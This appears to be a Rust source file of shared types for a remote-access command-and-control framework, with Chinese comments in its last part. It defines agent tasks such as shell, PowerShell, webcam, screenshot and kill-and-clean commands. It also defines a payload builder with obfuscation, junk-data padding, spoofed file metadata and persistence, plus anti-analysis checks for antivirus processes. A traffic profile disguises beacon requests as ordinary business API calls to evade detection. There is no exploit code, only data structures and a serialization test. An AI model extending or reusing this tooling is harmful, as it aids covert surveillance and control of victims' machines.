use serde::{Deserialize, Serialize};

// ── Enums ──────────────────────────────────────────────────────────────

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub enum AgentStatus {
    Online,
    Offline,
    Sleeping,
    Compromised,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub enum TaskStatus {
    Pending,
    Sent,
    Running,
    Completed,
    Failed,
    Cancelled,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub enum UserRole {
    Operator,
    Admin,
}

#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
pub enum CommandType {
    Shell,
    PowerShell,
    LocalAccounts,
    Upload,
    Download,
    Screenshot,
    Webcam,
    WifiScan,
    Kill,
    Sleep,
    Proxy,
    FileList,
    FileDrives,
    KillAndClean,
    Restart,
}

// ── Task ───────────────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct AgentTask {
    pub id: String,
    #[serde(default)]
    pub agent_id: String,
    #[serde(default)]
    pub created_by: String,
    pub command_type: CommandType,
    #[serde(default)]
    pub command: String,
    #[serde(default)]
    pub arguments: Vec<String>,
    pub status: TaskStatus,
    #[serde(default)]
    pub output: Option<String>,
    #[serde(default)]
    pub error: Option<String>,
    #[serde(default = "default_timeout")]
    pub timeout_seconds: i32,
}

fn default_timeout() -> i32 {
    60
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct TaskCreateRequest {
    #[serde(default)]
    pub agent_id: String,
    pub command_type: CommandType,
    #[serde(default)]
    pub command: String,
    #[serde(default)]
    pub arguments: Vec<String>,
    #[serde(default = "default_timeout")]
    pub timeout_seconds: i32,
}

impl AgentTask {
    pub fn new(id: String, agent_id: String, command_type: CommandType, command: String) -> Self {
        Self {
            id,
            agent_id,
            created_by: String::new(),
            command_type,
            command,
            arguments: Vec::new(),
            status: TaskStatus::Pending,
            output: None,
            error: None,
            timeout_seconds: 60,
        }
    }
}

// ── Hardware Info ──────────────────────────────────────────────────────
//
// These serialize to camelCase so the C# server model (PascalCase, bound
// case-insensitively) receives RAM/Disk/CPU fields correctly. Without this,
// snake_case fields like `total_bytes` failed to bind and showed up empty.

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct HardwareInfo {
    #[serde(default)]
    pub hwid: Option<String>,
    pub cpu: Option<CpuInfo>,
    #[serde(default)]
    pub gpus: Vec<GpuInfo>,
    #[serde(default)]
    pub disks: Vec<DiskInfo>,
    pub ram: Option<RamInfo>,
    #[serde(default)]
    pub displays: Vec<DisplayInfo>,
    #[serde(default)]
    pub motherboard_vendor: Option<String>,
    #[serde(default)]
    pub bios_version: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct CpuInfo {
    #[serde(default)]
    pub name: String,
    pub physical_cores: usize,
    pub logical_cores: usize,
    pub max_clock_mhz: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct GpuInfo {
    #[serde(default)]
    pub name: String,
    #[serde(default)]
    pub driver_version: Option<String>,
    pub vram_bytes: Option<u64>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct DiskInfo {
    #[serde(default)]
    pub model: String,
    pub size_bytes: u64,
    #[serde(default)]
    pub media_type: Option<String>,
    #[serde(default)]
    pub serial_number: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct RamInfo {
    pub total_bytes: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct DisplayInfo {
    #[serde(default)]
    pub name: String,
    pub width: u32,
    pub height: u32,
}

// ── Build Config ───────────────────────────────────────────────────────

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct BuildConfigRequest {
    #[serde(default = "default_platform")]
    pub platform: String,
    #[serde(default = "default_app_type")]
    pub application_type: String,
    #[serde(default = "default_host")]
    pub server_host: String,
    #[serde(default = "default_port")]
    pub server_port: u16,
    #[serde(default)]
    pub enable_obfuscation: bool,
    #[serde(default)]
    pub inject_junk_data: bool,
    #[serde(default = "default_junk_mb")]
    pub junk_data_mb: usize,
    #[serde(default)]
    pub icon_url: Option<String>,
    #[serde(default)]
    pub company_name: Option<String>,
    #[serde(default)]
    pub file_description: Option<String>,
    #[serde(default)]
    pub product_name: Option<String>,
    #[serde(default)]
    pub copyright: Option<String>,
    #[serde(default)]
    pub file_version: Option<String>,
    #[serde(default = "default_true")]
    pub trim_unused: bool,
    #[serde(default)]
    pub require_admin: bool,
    #[serde(default)]
    pub copy_to_app_data: bool,
    #[serde(default)]
    pub enable_persistence: bool,
    /// Language selector: "csharp" or "rust"
    #[serde(default = "default_lang")]
    pub language: String,
}

fn default_platform() -> String {
    "x64".into()
}
fn default_app_type() -> String {
    "Console".into()
}
fn default_host() -> String {
    "127.0.0.1".into()
}
fn default_port() -> u16 {
    5270
}
fn default_junk_mb() -> usize {
    10
}
fn default_true() -> bool {
    true
}
fn default_lang() -> String {
    "csharp".into()
}

// ── Config Injection (appended to binary at build time) ────────────────

/// Magic bytes that mark the start of the injected config block.
pub const CONFIG_MAGIC: &[u8; 16] = b"LIBRA_CFG_BLOCK!";

/// Anti-analysis detection configuration.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AntiAnalysisConfig {
    #[serde(default)]
    pub enabled: bool,
    #[serde(default = "default_true")]
    pub check_test_signing: bool,
    #[serde(default = "default_true")]
    pub check_av_processes: bool,
}

impl Default for AntiAnalysisConfig {
    fn default() -> Self {
        Self {
            enabled: false,
            check_test_signing: true,
            check_av_processes: true,
        }
    }
}

/// Config data injected into the binary at build time.
/// Accepts both camelCase (Rust) and snake_case (C#) field names.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct InjectedConfig {
    #[serde(alias = "server_url")]
    pub server_url: String,
    #[serde(alias = "register_path")]
    pub register_path: String,
    #[serde(alias = "heartbeat_path")]
    pub heartbeat_path: String,
    #[serde(alias = "result_path")]
    pub result_path: String,
    #[serde(alias = "ws_path")]
    pub ws_path: String,
    #[serde(alias = "heartbeat_interval_ms")]
    pub heartbeat_interval_ms: u64,
    #[serde(alias = "jitter_percent")]
    pub jitter_percent: f64,
    #[serde(alias = "require_admin")]
    pub require_admin: bool,
    #[serde(alias = "copy_to_path")]
    pub copy_to_path: Option<String>,
    #[serde(alias = "enable_persistence")]
    pub enable_persistence: bool,
    #[serde(default, alias = "core_download_path")]
    pub core_download_path: String,
    #[serde(default = "default_core_key_path", alias = "core_key_path")]
    pub core_key_path: String,
    #[serde(default, alias = "beacon_secret")]
    pub beacon_secret: String,
    #[serde(default, alias = "anti_analysis")]
    pub anti_analysis: AntiAnalysisConfig,
}

fn default_core_key_path() -> String {
    "/api/beacon/core-key".into()
}

// ── 流量伪装 Profile（单入口内部路由）──────────────────────────────────

/// 注册响应下发的流量伪装配置。
///
/// 设计：控制面全部走「单入口 POST + 密文内部路由」——
///   所有 beacon 请求 POST 到 `entry_path`，请求体是业务风格的外层壳：
///     { "<data_key>": "<AES-GCM 密文>", "<ts_key>": <毫秒时间戳>, "<rand_key>": "<随机hex>" }
///   密文内部是路由信封（见 `BeaconEnvelope`）：op 决定服务端分发
///   （心跳/结果/模块下载/注册），agent 标识 token 也在密文内。
///
/// 效果：无固定标识头、无可枚举功能路径、路径/字段名/UA/节奏全部可配置，
/// 信标检测三要素（路径/头/节奏）随机化。
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ProfileTransform {
    /// 单入口路径前缀（如 /api、/index.php、/graphql）。服务端按此前缀路由，
    /// 之后的路径段全部忽略（虚假业务地址）。
    #[serde(default = "default_entry_path")]
    pub entry_path: String,
    /// 虚假业务路径段列表：每次请求随机拼一个到入口后
    /// （如 /api/user/info、/api/orders/123），空 = 不加后缀。
    #[serde(default)]
    pub path_suffixes: Vec<String>,
    /// 外层壳：密文字段名。
    #[serde(default = "default_data_key")]
    pub data_key: String,
    /// 外层壳：时间戳字段名。
    #[serde(default = "default_ts_key")]
    pub ts_key: String,
    /// 外层壳：随机字段名。
    #[serde(default = "default_rand_key")]
    pub rand_key: String,
    /// 外层壳：假签名字段名（空 = 不加签名）。
    /// 值为 HMAC-SHA256(beacon_secret, ts|data) 的 hex —— 真实算法，
    /// 让请求在结构上等价于带鉴权的业务 API。
    #[serde(default = "default_sign_key")]
    pub sign_key: String,
    /// UA 轮换列表（空 = 用构建时的默认 UA）。
    #[serde(default)]
    pub user_agents: Vec<String>,
    /// 心跳/结果明文尾部随机 padding 字符数范围（密文长度随机化）。
    #[serde(default = "default_padding_min")]
    pub padding_min: u32,
    #[serde(default = "default_padding_max")]
    pub padding_max: u32,
    /// 心跳间隔（毫秒），注册响应覆盖构建时值。
    #[serde(default)]
    pub heartbeat_interval_ms: u64,
    /// 抖动百分比（0.0-1.0）。
    #[serde(default)]
    pub jitter_percent: f64,
}

fn default_entry_path() -> String { "/api".into() }
fn default_data_key() -> String { "d".into() }
fn default_ts_key() -> String { "ts".into() }
fn default_rand_key() -> String { "r".into() }
fn default_sign_key() -> String { String::new() }
fn default_padding_min() -> u32 { 0 }
fn default_padding_max() -> u32 { 64 }

impl Default for ProfileTransform {
    fn default() -> Self {
        Self {
            entry_path: default_entry_path(),
            path_suffixes: Vec::new(),
            data_key: default_data_key(),
            ts_key: default_ts_key(),
            rand_key: default_rand_key(),
            sign_key: default_sign_key(),
            user_agents: Vec::new(),
            padding_min: default_padding_min(),
            padding_max: default_padding_max(),
            heartbeat_interval_ms: 0,
            jitter_percent: 0.0,
        }
    }
}

/// 密文内部的路由信封：op 决定服务端分发，token 为会话标识。
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct BeaconEnvelope {
    /// hb=心跳, res=结果, mod=模块下载, reg=注册
    pub op: String,
    /// 会话 token（reg 时为注册数据）
    pub id: String,
    /// 业务数据（JSON 字符串）
    #[serde(default)]
    pub data: String,
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn hardware_serializes_camel_case() {
        let hw = HardwareInfo {
            hwid: Some("abc".into()),
            cpu: Some(CpuInfo {
                name: "Intel".into(),
                physical_cores: 8,
                logical_cores: 16,
                max_clock_mhz: 4000,
            }),
            gpus: vec![],
            disks: vec![DiskInfo {
                model: "SSD".into(),
                size_bytes: 512_000_000_000,
                media_type: None,
                serial_number: None,
            }],
            ram: Some(RamInfo { total_bytes: 16_000_000_000 }),
            displays: vec![],
            motherboard_vendor: None,
            bios_version: None,
        };

        let json = serde_json::to_string(&hw).unwrap();

        assert!(json.contains("\"totalBytes\""), "ram should serialize camelCase: {json}");
        assert!(json.contains("\"sizeBytes\""), "disk should serialize camelCase: {json}");
        assert!(json.contains("\"physicalCores\""), "cpu should serialize camelCase: {json}");
        assert!(!json.contains("\"total_bytes\""));
    }
}
